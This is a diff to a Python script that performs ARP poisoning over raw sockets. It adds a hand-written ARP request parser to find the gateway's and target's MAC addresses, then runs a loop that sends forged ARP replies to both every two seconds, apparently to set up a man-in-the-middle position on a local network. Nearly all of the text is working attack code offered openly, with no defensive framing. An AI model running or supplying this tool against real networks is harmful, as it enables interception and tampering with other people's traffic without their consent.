@@ -34,7 +34,31 @@ def scapy_get_mac(ip_address):
     return None
 
 
-def send_arp_packet(dest_ip, dest_mac, target_ip, local_mac):
+def get_mac(dest_ip, dest_mac, target_ip, local_mac):
+    rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    send_arp_packet(1, dest_ip, dest_mac, target_ip, local_mac)
+
+    while True:
+        packet = rawSocket.recvfrom(65535)
+
+        ethernet_header = packet[0][0:14]
+        ethernet_detailed = struct.unpack("!6s6s2s", ethernet_header)
+
+        arp_header = packet[0][14:42]
+        arp_detailed = struct.unpack("2s2s1s1s2s6s4s6s4s", arp_header)
+
+
+
+        # skip non-ARP packets
+        ethertype = ethernet_detailed[2]
+        if ethertype != b'\x08\x06':
+            continue
+
+        if arp_detailed[6] == dest_ip:
+            return arp_detailed[5]
+
+
+def send_arp_packet(operation, dest_ip, dest_mac, target_ip, local_mac):
     raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
     raw.bind(('eth0', socket.htons(0x0800)))
 
@@ -48,7 +72,7 @@ def send_arp_packet(dest_ip, dest_mac, target_ip, local_mac):
     type_protocol = 0x0800  # IPV4
     size_addr_hardware = 6
     size_addr_protocol = 4
-    operation = 2
+    operation = operation
 
     arp_addr = struct.pack("!HHBBH6s4s6s4s", type_hardware, type_protocol,
                            size_addr_hardware, size_addr_protocol, operation,
@@ -68,8 +92,8 @@ def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, local_mac):
     print("[*] Started ARP poison attack [CTRL-C to stop]")
     try:
         while True:
-            send_arp_packet(gateway_ip, gateway_mac, target_ip, local_mac)
-            send_arp_packet(target_ip, target_mac, gateway_ip, local_mac)
+            send_arp_packet(2, gateway_ip, gateway_mac, target_ip, local_mac)
+            send_arp_packet(2, target_ip, target_mac, gateway_ip, local_mac)
             time.sleep(2)
     except KeyboardInterrupt:
         print("[*] Stopped ARP poison attack. Restoring network")
@@ -85,21 +109,22 @@ print(f"[*] Target IP address: {target_ip_str} \n")
 
 gateway_ip = socket.inet_aton(gateway_ip_str)
 target_ip = socket.inet_aton(target_ip_str)
+local_ip = socket.inet_aton(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
 
-gateway_mac = binascii.unhexlify(scapy_get_mac(gateway_ip_str).replace(':', ''))
+local_mac = binascii.unhexlify(getHwAddr('eth0').replace(':', ''))
+broadcast_address = binascii.unhexlify("ffffffffffff")
+
+gateway_mac = get_mac(gateway_ip, broadcast_address, local_ip, local_mac)
 if gateway_mac is None:
     print("[!] Unable to get gateway MAC address. Exiting..")
     sys.exit(0)
 
 
-target_mac = binascii.unhexlify(scapy_get_mac(target_ip_str).replace(':', ''))
+target_mac = get_mac(target_ip, broadcast_address, local_ip, local_mac)
 if target_mac is None:
     print("[!] Unable to get target MAC address. Exiting..")
     sys.exit(0)
 
-
-local_mac = binascii.unhexlify(getHwAddr('eth0').replace(':', ''))
-local_ip = socket.inet_aton(ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'])
 
 print(f"[*] Local IP binary address: {local_ip}")
 print(f"[*] Gateway IP binary address: {gateway_ip}")
@@ -113,8 +138,8 @@ print(f"[*] Local MAC binary address: {local_mac}")
 print(f"[*] Gateway MAC binary address: {gateway_mac}")
 print(f"[*] Target MAC binary address: {target_mac} \n")
 
-# send_arp_packet(1, gateway_ip, gateway_mac, local_ip, local_mac)
-
+ 
 # ARP poison thread
 poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac, local_mac))
 poison_thread.start()
+
